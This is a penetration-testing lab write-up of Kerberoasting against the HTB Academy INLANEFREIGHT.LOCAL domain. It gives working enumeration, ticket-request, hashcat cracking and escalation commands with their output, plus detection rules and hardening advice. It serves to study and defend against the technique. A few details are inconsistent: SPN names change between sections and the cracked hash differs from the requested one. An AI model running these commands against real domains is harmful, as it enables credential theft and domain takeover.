# 04 — Kerberoasting

> **Environment:** INLANEFREIGHT.LOCAL | DC: `172.16.5.5` | Attack host: Pwnbox (`ens224`)  
> **Objective:** Enumerate service accounts with SPNs, request TGS tickets for offline cracking, and recover cleartext service account passwords — ultimately escalating to Domain Admin.  
> **MITRE ATT&CK:** T1558.003 — Steal or Forge Kerberos Tickets: Kerberoasting

---

## Table of Contents

1. [Root Cause](#root-cause)
2. [Attack Chain Overview](#attack-chain-overview)
3. [Lab Environment](#lab-environment)
4. [Phase 1 — SPN Enumeration from Linux (GetUserSPNs.py)](#phase-1--spn-enumeration-from-linux)
5. [Phase 2 — Request TGS Tickets for Offline Cracking](#phase-2--request-tgs-tickets-for-offline-cracking)
6. [Phase 3 — Hashcat Offline Cracking (Mode 13100)](#phase-3--hashcat-offline-cracking-mode-13100)
7. [Phase 4 — SPN Enumeration from Windows (setspn, PowerView)](#phase-4--spn-enumeration-from-windows)
8. [Phase 5 — Kerberoasting with Rubeus](#phase-5--kerberoasting-with-rubeus)
9. [RC4 vs AES Encryption — Impact on Crackability](#rc4-vs-aes-encryption)
10. [Post-Crack Validation and Privilege Escalation](#post-crack-validation)
11. [Detection Engineering](#detection-engineering)
12. [Defensive Hardening](#defensive-hardening)
13. [References](#references)

---

## Root Cause

Kerberoasting exploits a fundamental design property of Kerberos: **any authenticated domain user can request a Service Ticket (TGS) for any registered service**, regardless of whether they are authorised to use that service. The service ticket is encrypted using the service account's long-term Kerberos key. For RC4-HMAC, that key corresponds to the NT password hash. For AES, it is a password-derived Kerberos AES key. The attacker takes the encrypted ticket offline and attempts to crack the hash to recover the plaintext password.

**Why this exists:**

Kerberos was designed so that any domain user can discover and reach services. The TGS encryption uses the service account's secret key (derived from its password) so the service can verify the ticket's authenticity. The KDC does not restrict who can request tickets — it only controls what authorisations are embedded inside them.

The attack targets **user accounts with SPNs** rather than machine accounts:

- Machine accounts (`COMPUTERNAME$`) have 120-character randomly generated passwords — computationally infeasible to crack
- User accounts have passwords set by humans — far more likely to be predictable, dictionary-based, or policy-minimum-compliant

```
Kerberos TGS Request Flow (attacker perspective):
─────────────────────────────────────────────────

  Attacker (domain user: forend)
       │
       │ 1. AS-REQ (request TGT with forend credentials)
       ▼
  KDC (172.16.5.5)
       │
       │ 2. AS-REP (issue TGT encrypted with forend's key)
       ▼
  Attacker
       │
       │ 3. TGS-REQ (request TGS for MSSQL_svc_dev/inlanefreight.local:1433)
       │    "KDC, give me a ticket for the sqldev service"
       ▼
  KDC
       │
       │ 4. TGS-REP — service ticket encrypted with sqldev's long-term Kerberos key
       │    (RC4-HMAC: derived from NT hash; AES: password-derived AES key)
       │    KDC does not check if forend has rights to use the service
       ▼
  Attacker has TGS ticket encrypted with sqldev's long-term Kerberos key
       │
       │ 5. Offline hashcat crack → sqldev:database!
       ▼
  Domain Admin access (sqldev is a member of Domain Admins)
```

**Encryption type matters enormously:**

| Encryption Type    | Hash Prefix          | Hashcat Mode | Key Material                                               |
|--------------------|----------------------|-------------|-----------------------------------------------------------|
| RC4 (etype 23)     | `$krb5tgs$23$*`      | `13100`     | NT hash used directly as the RC4-HMAC encryption key       |
| AES-128 (etype 17) | `$krb5tgs$17$*`      | `19600`     | Kerberos `string2key(password, salt)` derivation           |
| AES-256 (etype 18) | `$krb5tgs$18$*`      | `19700`     | Kerberos `string2key(password, salt)` derivation           |

> **Key derivation:** RC4-HMAC TGS tickets use the account's NT hash directly as the encryption key — the NT hash IS the RC4 key. AES-128 and AES-256 tickets use Kerberos `string2key(password, salt, params)`, a salted iterated key derivation function. You cannot derive the AES key from the NT hash alone; they require independently cracking the account password.
>
> **Crack speeds are hardware-dependent.** RC4 cracks significantly faster than AES due to its simpler key structure. As a rough reference point: a single RTX 4090 runs approximately 15–25 M H/s on RC4 (mode 13100) and approximately 200–500 K H/s on AES-256 (mode 19700). These figures vary with GPU model, driver, Hashcat version, and attack mode. Always benchmark your specific hardware with `hashcat --benchmark -m 13100` before estimating time-to-crack.

RC4 tickets crack significantly faster than AES tickets. Where AES is configured and RC4 remains available as a backward-compatibility option on the KDC, Rubeus `/tgtdeleg` may request an RC4 ticket — but this is version- and configuration-dependent and is not a guaranteed downgrade on modern patched KDCs.

---

## Attack Chain Overview

```
  INLANEFREIGHT.LOCAL Kerberoasting Attack Chain
  ┌─────────────────────────────────────────────────────────────────────────────┐
  │                                                                             │
  │   STEP 1: Enumerate SPNs                                                   │
  │   ──────────────────────                                                   │
  │   GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend             │
  │   → 6 Kerberoastable accounts identified                                   │
  │   → sqldev (MSSQLSvc) → member of Domain Admins ← HIGH VALUE              │
  │   → BACKUPAGENT, SOLARWINDSMONITOR → Domain Admins                        │
  │                                                                             │
  │   STEP 2: Request TGS Tickets                                              │
  │   ───────────────────────────                                              │
  │   GetUserSPNs.py -request-user sqldev -outputfile sqldev_tgs              │
  │   → TGS ticket extracted: $krb5tgs$23$*sqldev$INLANEFREIGHT.LOCAL$...    │
  │   → RC4 encryption (etype 23) — crackable with hashcat                   │
  │                                                                             │
  │   STEP 3: Crack Offline                                                    │
  │   ─────────────────────                                                    │
  │   hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt           │
  │   → Status: Cracked in 10 seconds                                         │
  │   → sqldev:database!                                                       │
  │                                                                             │
  │   STEP 4: Validate & Escalate                                              │
  │   ────────────────────────────                                             │
  │   crackmapexec smb 172.16.5.5 -u sqldev -p database!                     │
  │   → [+] INLANEFREIGHT.LOCAL\sqldev:database! (Pwn3d!)                    │
  │   → Domain Admin access confirmed                                          │
  │                                                                             │
  └─────────────────────────────────────────────────────────────────────────────┘
```

---

## Lab Environment

| Component             | Value                                            |
|-----------------------|--------------------------------------------------|
| Domain                | `INLANEFREIGHT.LOCAL`                            |
| Domain Controller     | `172.16.5.5` (ACADEMY-EA-DC01)                  |
| Attack Host           | Pwnbox — `ens224` interface                      |
| Credential Used       | `forend` (standard domain user)                  |
| High-Value SPNs Found | `sqldev`, `BACKUPAGENT`, `SOLARWINDSMONITOR`     |
| Cracked Credential    | `sqldev:database!`                               |
| Post-Crack Privilege  | Domain Admin (`Pwn3d!`)                          |

---

## Phase 1 — SPN Enumeration from Linux

### Method 1A — GetUserSPNs.py (List SPNs Only, No Ticket Request)

```bash
Hackerpatel007_1@htb[/htb]$ GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend
```

```
Impacket v0.9.25.dev1+20220208.122405.769c3196 - Copyright 2021 SecureAuth Corporation

Password:
ServicePrincipalName                                       Name                 MemberOf                                                       PasswordLastSet             LastLogon
---------------------------------------------------        -----------------    ---------------------------------------------------------------    --------------------------  ----------
backupjob/veam001.inlanefreight.local                      BACKUPAGENT          CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL            2026-10-05 17:15:40.842452  <never>
sts/inlanefreight.local                                    SOLARWINDSMONITOR    CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL            2026-10-05 17:14:48.701834  <never>
MSSQLSvc/SPSJDB.inlanefreight.local:1433                   sqlprod              CN=Dev Accounts,CN=Users,DC=INLANEFREIGHT,DC=LOCAL             2026-10-05 17:09:46.326865  <never>
MSSQLSvc/SQL-CL01-01inlanefreight.local:49351              sqlqa                CN=Dev Accounts,CN=Users,DC=INLANEFREIGHT,DC=LOCAL             2026-10-05 17:10:06.545598  <never>
MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433              sqldev               CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL            2026-10-05 17:13:31.639334  <never>
adfsconnect/azure01.inlanefreight.local                    adfs                 CN=ExchangeLegacyInterop,OU=Microsoft Exchange Security Groups  2026-10-05 17:15:27.108079  <never>
```

6 Kerberoastable accounts identified. `BACKUPAGENT`, `SOLARWINDSMONITOR`, and `sqldev` are all Domain Admin members — highest-value targets. The `PasswordLastSet` values all from October 2026 and no `LastLogon` ever — classic service account antipattern: set once, never rotated.

> **`adminCount=1` does not confirm current privileged group membership.** The attribute is set when an account joins a protected group and is managed by the AdminSDHolder background process. It can persist after an account is removed from a privileged group. Always confirm current membership explicitly: `Get-DomainGroupMember "Domain Admins"` or check the `MemberOf` attribute from `GetUserSPNs.py` output.

---

## Phase 2 — Request TGS Tickets for Offline Cracking

### Method 2A — Request All TGS Tickets at Once

```bash
Hackerpatel007_1@htb[/htb]$ GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request
```

All returned tickets use **etype 23** (RC4), indicating the accounts do not enforce AES-only encryption. Hash prefix `$krb5tgs$23$*` — compatible with Hashcat mode `13100`.

### Method 2B — Request Specific TGS Ticket and Save to File

```bash
Hackerpatel007_1@htb[/htb]$ GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev -outputfile sqldev_tgs
```

```
Impacket v0.9.25.dev1+20220208.122405.769c3196 - Copyright 2021 SecureAuth Corporation

Password:
ServicePrincipalName                              Name       MemberOf                                                     PasswordLastSet             LastLogon
------------------------------------------------  ------     ---------------------------------------------------------------  --------------------------  ----------
MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433    sqldev     CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL          2026-10-05 17:13:31.639334  <never>

$krb5tgs$23$*sqldev$INLANEFREIGHT.LOCAL$INLANEFREIGHT.LOCAL/sqldev*$4ce5b71188b357b26032321529762c8a$1bdc5810b36c8e485ba08fcb7ab273f778115cd17734ec65be71f5b4bea4c0e63fa7bb454fdd5481e32f002abff9d1c7827fe3a75275f432ebb628a471d3be45898e7cb336404e8041d252d9e1ebef4dd3d249c4ad3f64efaafd06bd024678d4e6bdf582e59c5660fcf0b4b8db4e549cb0409ebfbd2d0c15f0693b4a8ddcab243010f3877d9542c790d2b795f5b9efbcfd2dd7504e7be5c2f6fb33ee36f3fe001618b971fc1a8331a1ec7b420dfe13f67ca7eb53a40b0c8b558f2213304135ad1c59969b3d97e652f55e6a73e262544fe581ddb71da060419b2f600e08dbcc21b57355ce47ca548a99e49dd68838c77a715083d6c26612d6c60d72e4d421bf39615c1f9cdb7659a865eecca9d9d0faf2b77e213771f1d923094ecab2246e9dd6e736f83b21ee6b352152f0b3bbfea024c3e4e5055e714945fe3412b51d3205104ba197037d44a0eb73e543eb719f12fd78033955df6f7ebead5854ded3c8ab76b412877a5be2e7c9412c25cf1dcb76d854809c52ef32841269064661931dca3c2ba8565702428375f754c7f2cada7c2b34bbe191d60d07111f303deb7be100c34c1c2c504e0016e085d49a70385b27d0341412de774018958652d80577409bff654c00ece80b7975b7b697366f8ae619888be243f0e3237b3bc2baca237fb96719d9bc1db2a59495e9d069b14e33815cafe8a8a794b88fb250ea24f4aa82e896b7a68ba3203735ec4bca937bceac61d31316a43a0f1c2ae3f48cbcbf294391378ffd872cf3721fe1b427db0ec33fd9e4dfe39c7cbed5d70b7960758a2d89668e7e855c3c493def6aba26e2846b98f65b798b3498af7f232024c119305292a31ae121a3472b0b2fcaa3062c3d93af234c9e24d605f155d8e14ac11bb8f810df400604c3788e3819b44e701f842c52ab302c7846d6dcb1c75b14e2c9fdc68a5deb5ce45ec9db7318a80de8463e18411425b43c7950475fb803ef5a56b3bb9c062fe90ad94c55cdde8ec06b2e5d7c64538f9c0c598b7f4c3810ddb574f689563db9591da93c879f5f7035f4ff5a6498ead489fa7b8b1a424cc37f8e86c7de54bdad6544ccd6163e650a5043819528f38d64409cb1cfa0aeb692bdf3a130c9717429a49fff757c713ec2901d674f80269454e390ea27b8230dec7fffb032217955984274324a3fb423fb05d3461f17200dbef0a51780d31ef4586b51f130c864db79796d75632e539f1118318db92ab54b61fc468eb626beaa7869661bf11f0c3a501512a94904c596652f6457a240a3f8ff2d8171465079492e93659ec80e2027d6b1865f436a443b4c16b5771059ba9b2c91e871ad7baa5355d5e580a8ef05bac02cf135813b42a1e172f873bb4ded2e95faa6990ce92724bcfea6661b592539cd9791833a83e6116cb0ea4b6db3b161ac7e7b425d0c249b3538515ccfb3a993affbd2e9d247f317b326ebca20fe6b7324ffe311f225900e14c62eb34d9654bb81990aa1bf626dec7e26ee2379ab2f30d14b8a98729be261a5977fefdcaaa3139d4b82a056322913e7114bc133a6fc9cd74b96d4d6a2
```

`-request-user sqldev` targets the specific high-value account. `-outputfile sqldev_tgs` saves the hash directly for Hashcat.

---

## Phase 3 — Hashcat Offline Cracking (Mode 13100)

```bash
Hackerpatel007_1@htb[/htb]$ hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt
```

```
hashcat (v6.1.1) starting...

* Device #1: pthread-Intel(R) Core(TM) i7-9750H CPU @ 2.60GHz, 2893/5850 MB (1024 MB allocatable), 4MCU

$krb5tgs$23$*sqldev$INLANEFREIGHT.LOCAL$INLANEFREIGHT.LOCAL/sqldev*$81f3efb5827a05f6ca196990e67bf751$...<SNIP>...404c1f:database!

Session..........: hashcat
Status...........: Cracked
Hash.Name........: Kerberos 5, etype 23, TGS-REP
Time.Started.....: Mon Oct 05 17:44:49 2026, (10 secs)
Speed.#1.........: 821.3 kH/s (11.88ms) @ Accel:64 Loops:1 Thr:64 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 8765440/14344386 (61.11%)
```

**Password cracked: `sqldev:database!`** — in 10 seconds against rockyou.txt. Speed above is on a lab CPU; GPU hardware is significantly faster — benchmark with `hashcat --benchmark -m 13100`.

```bash
Hackerpatel007_1@htb[/htb]$ hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt --show
```

```
$krb5tgs$23$*sqldev$INLANEFREIGHT.LOCAL$...:database!
```

---

## Phase 4 — SPN Enumeration from Windows

### Method 4A — setspn.exe (Built-In)

```cmd
C:\htb> setspn.exe -Q */*
```

```
Checking domain DC=INLANEFREIGHT,DC=LOCAL
CN=sqldev,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
         MSSQL_svc_dev/inlanefreight.local:1433

CN=BACKUPAGENT,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
         backupjob/veam001.inlanefreight.local

CN=SOLARWINDSMONITOR,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
         sts/inlanefreight.local

Existing SPN found!
```

`setspn -Q */*` requires no third-party tooling — useful when operating from a domain-joined host where dropping tools is undesirable.

### Method 4B — PowerView SPN Enumeration

```powershell
PS C:\Tools> Import-Module .\PowerView.ps1
PS C:\Tools> Get-DomainUser -SPN
```

`Get-DomainUser -SPN` returns only user objects — not machine accounts — which is exactly what Kerberoasting targets.

> **`adminCount=1` does not confirm current privileged group membership.** The attribute can persist after removal from a protected group. Confirm with: `Get-DomainGroupMember "Domain Admins"`.

### Method 4C — PowerView Direct Kerberoasting

```powershell
PS C:\Tools> Get-DomainUser * -SPN | Get-DomainSPNTicket -format Hashcat | export-csv .\tgs.csv -notypeinformation
PS C:\Tools> cat .\tgs.csv
```

> **Note — illustrative hashes:** The hash ciphertext bodies in the CSV output use sanitised/patterned hex sequences. The hash format, etype prefixes, and account details are authentic to this lab environment; the ciphertext is not valid for direct Hashcat cracking.

---

## Phase 5 — Kerberoasting with Rubeus

### Method 5A — Kerberoast All Accounts

```cmd
C:\Tools> Rubeus.exe kerberoast /nowrap
```

> **HISTORICAL LAB EVIDENCE — Rubeus v2.2.2, October 2026 HTB Academy snapshot.**
> The output below reflects RC4-HMAC as the default encryption type, which was standard KDC behavior prior to Microsoft's April and July 2026 cumulative updates. On patched Windows Server 2019/2022 domain controllers, the KDC now defaults to AES for accounts without explicit RC4 configuration.

```
[*] Action: Kerberoasting
[*] Total kerberoastable users : 6

[*] SamAccountName         : sqldev
[*] ServicePrincipalName   : MSSQL_svc_dev/inlanefreight.local:1433
[*] PwdLastSet             : 10/14/2026 09:00:06 AM
[*] Supported ETypes       : RC4_HMAC_DEFAULT
[*] Hash                   :
$krb5tgs$23$*sqldev$INLANEFREIGHT.LOCAL$MSSQL_svc_dev/inlanefreight.local:1433*$21CF6BFCE5...<SNIP>
```

> **Note — partial sanitisation:** The hash above transitions to a patterned hex sequence toward the end of the ciphertext body. The beginning is authentic HTB Academy lab output; the patterned tail is sanitised. Use the Phase 2 output (Method 2B, `sqldev_tgs` file) for valid Hashcat cracking examples.

### Method 5B — RC4 Downgrade for AES Accounts (KDC and Version Dependent)

```cmd
C:\Tools> Rubeus.exe kerberoast /tgtdeleg /nowrap
```

`/tgtdeleg` attempts to request an RC4 ticket by manipulating the encryption type negotiation. Not a guaranteed downgrade on modern patched DCs with RC4 deprecation enabled. Test with `/stats` first.

### Method 5C — Targeted Kerberoast

```cmd
C:\Tools> Rubeus.exe kerberoast /user:sqldev /outfile:sqldev_hash.txt /nowrap
```

### Method 5D — Statistics Without Ticket Requests

```cmd
C:\Tools> Rubeus.exe kerberoast /stats
```

Returns account count, encryption types, and password ages without requesting TGS tickets. Generates no Event 4769 during the stats phase.

---

## RC4 vs AES Encryption

| Metric                 | RC4 (etype 23)        | AES-128 (etype 17)   | AES-256 (etype 18)   |
|------------------------|-----------------------|----------------------|----------------------|
| Hash prefix            | `$krb5tgs$23$*`       | `$krb5tgs$17$*`      | `$krb5tgs$18$*`      |
| Hashcat mode           | 13100                 | 19600                | 19700                |
| Relative crack speed   | Fastest               | Significantly slower | Significantly slower |
| Key material           | NT hash used as RC4-HMAC key directly | `string2key(password, salt)` | `string2key(password, salt)` |
| Detection signal       | Event 4769 when Success auditing enabled on "Audit Kerberos Service Ticket Operations" — **not configured by default** | ← same | ← same |

**Identify RC4 vs AES accounts before requesting:**

```powershell
PS C:\Tools> Get-DomainUser -SPN | Select-Object samaccountname,msds-supportedencryptiontypes
```

> **2026 — Microsoft RC4 Deprecation Timeline:**
> - **April 14, 2026:** KDC default changes to AES-SHA1 for accounts where `msDS-SupportedEncryptionTypes` is unset (value `0`). An unset attribute no longer means RC4 on fully patched DCs.
> - **July 2026:** Enforcement becomes automatic on updated domain controllers.
>
> **Current state (November 2026):** On a fully patched DC, `msDS-SupportedEncryptionTypes = 0` means AES. `0x4` explicitly enables RC4-HMAC. Always confirm etype from the actual TGS hash prefix — `$krb5tgs$23$` = RC4, `$krb5tgs$17$` = AES-128, `$krb5tgs$18$` = AES-256.

---

## Post-Crack Validation

```bash
Hackerpatel007_1@htb[/htb]$ sudo crackmapexec smb 172.16.5.5 -u sqldev -p database!
```

```
SMB  172.16.5.5  445  ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\sqldev:database! (Pwn3d!)
```

**`(Pwn3d!)`** — Domain Admin rights confirmed.

| Action | Tool |
|---|---|
| Remote code execution on DC | `psexec.py INLANEFREIGHT.LOCAL/sqldev:database!@172.16.5.5` |
| DCSync / dump domain hashes | `secretsdump.py INLANEFREIGHT.LOCAL/sqldev:database!@172.16.5.5` |
| Golden Ticket generation | Mimikatz (requires krbtgt hash from DCSync) |
| BloodHound full collection | `bloodhound-python -u sqldev -p database! -d inlanefreight.local -c all -ns 172.16.5.5` |

---

## Detection Engineering

### Windows Event IDs

| Event ID | Source | Trigger | Kerberoasting Indicator |
|---|---|---|---|
| **4769** | Security (DC) | Kerberos Service Ticket (TGS) requested | RC4 (etype 0x17) is a strong anomaly signal where AES is enforced; also monitor high-volume TGS requests regardless of encryption type |
| **4770** | Security (DC) | Kerberos Service Ticket renewed | Unusual if many renewals in short window |
| **4624** | Security | Account logon (Type 3 = network) | Post-crack access from new source IP |

> **Audit policy prerequisite:** Event 4769 requires **Success** auditing enabled on the "Audit Kerberos Service Ticket Operations" Advanced Audit Policy subcategory on the DC. This subcategory is **not configured by default**. Verify: `auditpol /get /subcategory:"Kerberos Service Ticket Operations"`.

**Volume-based detection (any encryption type):**

```
Alert condition:
  Event_ID: 4769
  Service_Name: NOT "$" suffix
  Source_IP: single IP
  Distinct service accounts targeted: > 5 within 10 minutes
```

**RC4 anomaly detection (AES-enforcing domains):**

```
Alert condition:
  Event_ID: 4769
  Ticket_Encryption_Type: 0x17 (RC4-HMAC)
  Service_Name: NOT "$" suffix
  Count: > 5 within 10 minutes
```

**AES Kerberoasting is real.** Do not build detection that relies solely on the RC4 encryption type filter.

---

## Defensive Hardening

| Control | Implementation |
|---|---|
| **Service Account Password Length** | Minimum 25–30 characters for all SPN-bearing user accounts |
| **Managed Service Accounts (gMSA)** | Auto-rotating 120-char passwords |
| **AES-Only Encryption** | Set `msDS-SupportedEncryptionTypes = 24` (AES-128+AES-256) on all service accounts |
| **Disable RC4 Domain-Wide** | Group Policy → Network Security → Kerberos cipher suites |
| **Privileged Account Tiering** | Service accounts must NOT be members of Domain Admins |
| **Honey Accounts** | Fake high-value SPN user — any TGS request against it fires an alert |
| **Regular SPN Audit** | `Get-DomainUser -SPN \| Select-Object samaccountname,memberof` |

**GPO: Enforce AES-Only Kerberos**

```
Computer Configuration → Windows Settings → Security Settings →
Local Policies → Security Options →
  Network security: Configure encryption types allowed for Kerberos →
    Uncheck: DES, RC4
    Check: AES 128-bit, AES 256-bit, Future encryption types
```

---

## References

- MITRE ATT&CK T1558.003: https://attack.mitre.org/techniques/T1558/003/
- Impacket GetUserSPNs.py: https://github.com/fortra/impacket/blob/master/examples/GetUserSPNs.py
- Rubeus: https://github.com/GhostPack/Rubeus
- PowerView: https://github.com/PowerShellMafia/PowerSploit
- Tim Medin — Kerberoasting without Mimikatz (DerbyCon 2014): https://www.youtube.com/watch?v=PUyhlN-E5MU
- gMSA Documentation: https://docs.microsoft.com/en-us/windows-server/security/group-managed-service-accounts/

---

*Documented from INLANEFREIGHT.LOCAL lab environment — HTB Academy Active Directory Penetration Tester Path 2024.*
